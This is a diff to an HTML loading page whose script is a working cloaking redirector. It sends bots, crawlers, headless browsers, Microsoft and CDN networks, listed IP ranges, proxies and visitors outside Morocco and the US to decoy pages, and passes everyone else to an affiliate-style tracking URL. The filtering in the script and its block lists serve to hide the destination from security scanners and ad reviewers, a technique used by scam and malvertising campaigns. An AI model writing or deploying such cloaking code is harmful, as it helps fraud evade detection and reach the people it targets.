@@ -4,13 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
+    <style>
+        /* باش تبان شي حاجة خفيفة للزائر حتى كيتوجه */
+        body { background-color: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
+    <div class="loader"></div>
+
     <script>
     (async function() {
+        // =====================
+        // CONFIG
+        // =====================
         const user_url = "https://www.aucsite.com/27X9TTQ2/7MHZBPX7/?creative_id=14580";
         const allowed_countries = ['MA', 'US'];
 
+        // =====================
+        // BLACKLISTS (ISPs)
+        // =====================
         const black_list = [
             "Microsoft Corp", "Microsoft Corporation", "Quality Technology", "U.s.next", "Longwood Medical", "Fastly", "Code 200", 
             "Netease", "Snmp Research", "Ifworld", "Royell Communications", "Penteledata", 
@@ -47,18 +61,24 @@
             "94.100.133.41", "141.38.1", "212.11.224", "212.11.225", "79.141.36.131"
         ];
 
-        // Anti-Duplicate (3 seconds)
+        // =====================
+        // ANTI-DUPLICATE / RATE LIMIT (3 SECONDS)
+        // =====================
         const now_time = Date.now();
         const last_time = sessionStorage.getItem('last_request_time');
+        
         if (last_time && (now_time - parseInt(last_time)) < 3000) {
             window.location.href = "indexx.html";
             return;
         }
         sessionStorage.setItem('last_request_time', now_time);
 
-        // User Agent Filter
+        // =====================
+        // USER AGENT / BOT FILTER
+        // =====================
         const user_agent = navigator.userAgent || '';
         const bad_agents = ['bot', 'crawl', 'spider', 'slurp', 'facebook', 'python', 'curl', 'wget', 'headless', 'phantom', 'selenium', 'puppeteer', 'microsoft'];
+        
         if (!user_agent || user_agent.length < 10) {
             window.location.href = "indexx.html";
             return;
@@ -70,14 +90,12 @@
             }
         }
 
+        // =====================
+        // GET GEO & PROXY DATA
+        // =====================
         try {
-            // استعملنا ipwho.is حيت كيعطي معلومات Proxy/Hosting
             const response = await fetch('https://ipwho.is/');
             const data = await response.json();
-
-            // --- DEBUG: هاد الـ alert غادي يبين ليك شنو كيرجع الـ API ---
-            // من بعد ما يتصلح كلشي، حيدو (مسحو).
-            alert("IP: " + data.ip + "\nCountry: " + data.country_code + "\nISP: " + (data.connection ? data.connection.isp : 'Unknown'));
 
             if (!data.success) {
                 window.location.href = "indexo.html";
@@ -90,7 +108,9 @@
             const is_hosting = data.security ? (data.security.hosting || false) : false;
             const is_proxy = data.security ? (data.security.proxy || false) : false;
 
-            // IP Block List
+            // =====================
+            // IP BLOCK LIST CHECK
+            // =====================
             for (let prefix of block_list) {
                 if (ip.startsWith(prefix)) {
                     window.location.href = "indexx.html";
@@ -98,19 +118,25 @@
                 }
             }
 
-            // Block Proxy/Hosting
+            // =====================
+            // BLOCK ALL PROXY / HOSTING / VPN
+            // =====================
             if (is_proxy || is_hosting) {
                 window.location.href = "indexx.html";
                 return;
             }
 
-            // Country Check
+            // =====================
+            // COUNTRY CHECK (MA, US ONLY)
+            // =====================
             if (!allowed_countries.includes(country)) {
                 window.location.href = "indexo.html";
                 return;
             }
 
-            // ISP Blacklist
+            // =====================
+            // ISP BLACKLIST
+            // =====================
             let ispBlocked = false;
             for (let item of black_list) {
                 if (isp.toLowerCase().includes(item.toLowerCase())) {
@@ -124,7 +150,9 @@
                 return;
             }
 
-            // Allowed
+            // =====================
+            // ALLOWED
+            // =====================
             window.location.href = user_url;
 
         } catch (error) {
